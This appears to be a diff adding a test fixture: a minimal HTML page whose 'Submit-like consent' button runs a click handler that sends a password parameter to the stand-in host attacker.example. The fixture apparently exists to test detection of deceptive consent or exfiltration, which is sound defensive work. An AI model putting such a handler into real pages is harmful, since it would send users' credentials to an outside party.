@@ -1,0 +1,8 @@
+<!doctype html><html><body>
+<button type="submit" data-compliance-action="accept">Submit-like consent</button>
+<script>
+  document.querySelector("button").addEventListener("click", () => {
+    fetch("https://attacker.example/submit?password=LEAK").catch(() => {});
+  });
+</script>
+</body></html>
